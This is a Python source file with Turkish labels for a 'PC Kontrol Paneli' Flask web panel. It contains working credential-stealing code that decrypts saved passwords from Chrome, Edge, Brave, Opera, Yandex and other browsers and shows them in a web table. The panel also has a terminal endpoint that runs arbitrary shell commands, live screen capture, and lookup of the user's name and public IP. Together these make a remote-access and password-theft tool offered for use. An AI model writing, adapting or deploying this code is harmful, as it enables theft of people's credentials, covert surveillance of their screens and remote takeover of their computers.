import os
import sqlite3
import shutil
import random
import threading
from base64 import b64decode
from json import loads
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from Crypto.Cipher import AES

from flask import Flask, Response, render_template_string, request, jsonify
from io import BytesIO
from PIL import Image
import mss
import getpass
import screen_brightness_control as sbc
from ctypes import cast
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import webbrowser
import subprocess
import requests

# ---------- Şifre Çekme Kısmı ----------
temp = os.getenv("TEMP")
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

class DATA_BLOB(Structure):
    _fields_ = [('cbData', wintypes.DWORD), ('pbData', POINTER(c_char))]

def decrypt_blob(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def decrypt_master_key(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()
    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return decrypt_blob(blob_out)

def decrypt_password(buff, master_key=None):
    try:
        if buff[:3] in (b'v10', b'v11'):
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16]
            return decrypted.decode()
        return ""
    except:
        return ""

def write_to_file(data, name="passwords"):
    path = os.path.join(os.getcwd(), f"{name}.txt")
    with open(path, "w", encoding="utf-8") as f:
        for line in data:
            if line:
                f.write(f"{line}\n")
    print(f"[+] Passwords saved: {path}")

def grab_passwords(browser_path, browser_name, profile="Default"):
    try:
        login_db = os.path.join(browser_path, profile, "Login Data")
        if not os.path.exists(login_db) or os.stat(login_db).st_size == 0:
            return []

        tmp_db = os.path.join(temp, "tmp" + ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db")
        shutil.copy2(login_db, tmp_db)
        conn = sqlite3.connect(tmp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        os.remove(tmp_db)

        key_file = os.path.join(browser_path, "Local State")
        with open(key_file, "r", encoding="utf-8") as f:
            local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = decrypt_master_key(master_key[5:])

        results = []
        for url, user, passwd in data:
            if url and user and passwd:
                decrypted_pass = decrypt_password(passwd, master_key)
                url = url.replace("https://","")
                url = url.replace("http://","")
                if decrypted_pass:
                    results.append(f"{browser_name}:{url}:{user}:{decrypted_pass}")
        return results
    except:
        return []

def run_all_browsers():
    browser_list = [
        ("Chrome", os.path.join(local, "Google/Chrome/User Data")),
        ("Chrome Beta", os.path.join(local, "Google/Chrome Beta/User Data")),
        ("Chrome Dev", os.path.join(local, "Google/Chrome Dev/User Data")),
        ("Chrome Canary", os.path.join(local, "Google/Chrome Canary/User Data")),
        ("Brave", os.path.join(local, "BraveSoftware/Brave-Browser/User Data")),
        ("Edge", os.path.join(local, "Microsoft/Edge/User Data")),
        ("Opera", os.path.join(roaming, "Opera Software/Opera Stable")),
        ("Opera GX", os.path.join(roaming, "Opera Software/Opera GX Stable")),
        ("Yandex", os.path.join(local, "Yandex/YandexBrowser/User Data")),
    ]

    all_passwords = []
    threads = []
    results = [[] for _ in browser_list]

    def worker(i, browser_info):
        name, path = browser_info
        results[i] = grab_passwords(path, name)

    for i, browser_info in enumerate(browser_list):
        t = threading.Thread(target=worker, args=(i, browser_info))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    for r in results:
        all_passwords.extend(r)

    write_to_file(all_passwords)

# ---------- Flask App Kısmı ----------
app = Flask(__name__)

# Ses kontrolü
devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
volume = cast(interface, POINTER(IAudioEndpointVolume))

# BASE_HTML Tailwind + toast
BASE_HTML = '''
<!doctype html>
<html lang="tr">
<head>
  <meta charset="utf-8">
  <title>PC Kontrol Paneli</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="flex h-screen bg-gradient-to-br from-gray-900 via-indigo-900 to-purple-900 text-gray-100 relative">
  <aside class="w-64 bg-indigo-950 p-6 flex flex-col">
    <h2 class="text-2xl font-bold mb-8 text-purple-400">⚡ Control</h2>
    <a href="{{ url_for('dashboard') }}" class="mb-3 py-2 px-3 rounded hover:bg-indigo-800 transition">📊 Dashboard</a>
    <a href="{{ url_for('screen_page') }}" class="mb-3 py-2 px-3 rounded hover:bg-indigo-800 transition">📺 Ekran</a>
    <a href="{{ url_for('control_page') }}" class="mb-3 py-2 px-3 rounded hover:bg-indigo-800 transition">🔊 Ses & Parlaklık</a>
    <a href="{{ url_for('url_page') }}" class="mb-3 py-2 px-3 rounded hover:bg-indigo-800 transition">🌐 URL Aç</a>
    <a href="{{ url_for('terminal_page') }}" class="mb-3 py-2 px-3 rounded hover:bg-indigo-800 transition">💻 Terminal</a>
    <a href="{{ url_for('passwords_page') }}" class="mb-3 py-2 px-3 rounded hover:bg-indigo-800 transition">🔑 Şifreler</a>
  </aside>
  <main class="flex-1 p-8 overflow-auto">
    <div class="bg-indigo-900/70 rounded-2xl p-6 shadow-lg">
      {{ content|safe }}
    </div>
  </main>

  <div id="toast-container" class="fixed top-4 right-4 space-y-2 z-50"></div>
  <script>
    function showToast(message,type="success"){
      const toast=document.createElement("div");
      toast.textContent=message;
      toast.className=`px-4 py-2 rounded shadow ${type==="success"?"bg-green-500":"bg-red-500"} text-white`;
      document.getElementById("toast-container").appendChild(toast);
      setTimeout(()=>{toast.remove();},3000);
    }
  </script>
</body>
</html>
'''

def render_page(content):
    return render_template_string(BASE_HTML, content=content)

# --- Dashboard ---
@app.route('/')
def dashboard():
    try:
        res = requests.get("http://ip-api.com/json/?fields=query,city,country,status")
        ip_data = res.json()
        ip_info = f"{ip_data.get('query')} ({ip_data.get('city')}, {ip_data.get('country')})" if ip_data.get("status")=="success" else "IP bilgisi alınamadı"
    except:
        ip_info = "IP bilgisi alınamadı"
    username = getpass.getuser()
    content = f"<h3 class='text-xl font-semibold mb-4'>📊 Dashboard</h3><p><b>Kullanıcı:</b> {username}</p><p><b>IP:</b> {ip_info}</p>"
    return render_page(content)

# --- Şifreler ---
@app.route('/passwords_page')
def passwords_page():
    run_all_browsers()
    path = os.path.join(os.getcwd(), "passwords.txt")
    table_rows = ""
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            parts = line.strip().split(":")
            if len(parts) == 4:
                browser, url, user, passwd = parts
                table_rows += f"<tr class='border-b border-gray-700 hover:bg-indigo-800'><td class='px-2 py-1'>{browser}</td><td class='px-2 py-1'>{url}</td><td class='px-2 py-1'>{user}</td><td class='px-2 py-1'>{passwd}</td></tr>"

    content = f"""
    <h3 class='text-xl font-semibold mb-4'>🔑 Şifreler</h3>
    <div class='overflow-auto rounded-lg shadow-lg'>
      <table class='w-full text-left border-collapse'>
        <thead>
          <tr class='bg-indigo-700'>
            <th class='px-2 py-1'>Tarayıcı</th>
            <th class='px-2 py-1'>URL</th>
            <th class='px-2 py-1'>Kullanıcı</th>
            <th class='px-2 py-1'>Şifre</th>
          </tr>
        </thead>
        <tbody>
          {table_rows}
        </tbody>
      </table>
    </div>
    """
    return render_page(content)


# --- Terminal ---
@app.route('/run_command', methods=['POST'])
def run_command():
    data = request.get_json()
    cmd = data.get('command', '')
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
        stdout = result.stdout or ""
        stderr = result.stderr or ""
        output = stdout + stderr
        if not output:
            output = "✅ Komut çalıştı ama çıktı yok."
        return jsonify({"output": output})
    except subprocess.TimeoutExpired:
        return jsonify({"output": "⏰ Komut zaman aşımına uğradı!"})
    except Exception as e:
        return jsonify({"output": f"⚠️ Hata: {str(e)}"})

@app.route('/terminal_page')
def terminal_page():
    content = """
    <h3 class='text-xl font-semibold mb-4'>💻 Terminal</h3>
    <input id='terminalInput' class='mb-2 p-2 w-full rounded bg-indigo-800 border-none' placeholder='Komut'>
    <button class='p-2 bg-gray-600 rounded hover:bg-gray-700 transition mb-2' onclick='runTerminal()'>Çalıştır</button>
    <pre id='terminalOutput' class='max-h-64 overflow-auto rounded bg-indigo-900 p-2'></pre>
    <script>
      function runTerminal(){
        const cmd=document.getElementById("terminalInput").value;
        fetch("/run_command",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({command:cmd})})
        .then(r=>r.json()).then(d=>{
          document.getElementById("terminalOutput").textContent=d.output||"⚠️ Hata";
        });
      }
    </script>
    """
    return render_page(content)

# --- Diğer sayfalar ---
@app.route('/screen_page')
def screen_page():
    content = """
    <h3 class='text-xl font-semibold mb-4'>🖥️ Canlı Ekran</h3>
    <img id="screen" class="rounded-lg shadow-lg" src="/screen">
    <script>
      const img=document.getElementById("screen");
      function updateImage(){
        fetch("/screen").then(r=>r.blob()).then(b=>{
          const url=URL.createObjectURL(b);
          img.src=url;
          img.onload=()=>URL.revokeObjectURL(url);
        });
      }
      setInterval(updateImage,1);
    </script>
    """
    return render_page(content)

@app.route('/screen')
def screen():
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        screenshot = sct.grab(monitor)
        img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
        buf = BytesIO()
        img.save(buf, format='JPEG')
        buf.seek(0)
        return Response(buf, mimetype='image/jpeg')

@app.route('/control_page')
def control_page():
    content = """
    <h3 class='text-xl font-semibold mb-4'>🔊 Ses & 💡 Parlaklık</h3>
    <div class='mb-4'>
      <label class='block mb-1'>Ses</label>
      <input type='range' id='volumeSlider' min='0' max='100' class='w-full'>
      <span id='volumeValue'></span>%
    </div>
    <div class='mb-4'>
      <label class='block mb-1'>Parlaklık</label>
      <input type='range' id='brightnessSlider' min='0' max='100' class='w-full'>
      <span id='brightnessValue'></span>%
    </div>
    <script>
      const volumeSlider=document.getElementById("volumeSlider");
      const volumeValue=document.getElementById("volumeValue");
      const brightnessSlider=document.getElementById("brightnessSlider");
      const brightnessValue=document.getElementById("brightnessValue");

      function updateSettings(){
        fetch("/get_settings").then(r=>r.json()).then(d=>{
          volumeSlider.value=d.volume; volumeValue.textContent=d.volume;
          brightnessSlider.value=d.brightness; brightnessValue.textContent=d.brightness;
        });
      }

      setInterval(updateSettings,500);

      function applySettings(){
        const v=volumeSlider.value;
        const b=brightnessSlider.value;
        volumeValue.textContent=v;
        brightnessValue.textContent=b;
        fetch("/set_volume",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({volume:v})});
        fetch("/set_brightness",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({brightness:b})});
      }

      volumeSlider.addEventListener("change", applySettings);
      brightnessSlider.addEventListener("change", applySettings);
    </script>
    """
    return render_page(content)

@app.route('/get_settings')
def get_settings():
    current_volume=int(volume.GetMasterVolumeLevelScalar()*100)
    try: current_brightness=sbc.get_brightness()[0]
    except: current_brightness=0
    return jsonify({"volume":current_volume,"brightness":current_brightness})

@app.route('/set_volume', methods=['POST'])
def set_volume():
    v=float(request.get_json().get("volume",50))/100
    volume.SetMasterVolumeLevelScalar(v,None)
    return jsonify({"status":"ok"})

@app.route('/set_brightness', methods=['POST'])
def set_brightness():
    try:
        sbc.set_brightness(int(request.get_json().get("brightness",50)))
        return jsonify({"status":"ok"})
    except Exception as e:
        return jsonify({"status":"error","message":str(e)}),500

@app.route('/url_page')
def url_page():
    content = """
    <h3 class='text-xl font-semibold mb-4'>🌐 URL Aç</h3>
    <div class='flex mb-2'>
      <input id='urlInput' class='flex-1 p-2 rounded bg-indigo-800 border-none' placeholder='https://...'>
      <button class='ml-2 p-2 bg-purple-600 rounded hover:bg-purple-700 transition' onclick='openUrl()'>Aç</button>
    </div>
    <script>
      function openUrl(){
        const url=document.getElementById("urlInput").value;
        fetch("/open_url",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({url:url})})
        .then(r=>r.json()).then(d=>{
          showToast(d.status==="ok"?"✅ Site açıldı":"❌ Geçersiz URL",d.status==="ok"?"success":"error");
        });
      }
    </script>
    """
    return render_page(content)

@app.route('/open_url', methods=['POST'])
def open_url():
    url = request.get_json().get("url")
    if url and url.startswith(('http://','https://')):
        webbrowser.open(url)
        return jsonify({"status":"ok"})
    return jsonify({"status":"error"}),400

if __name__ == '__main__':
    app.run(debug=True)
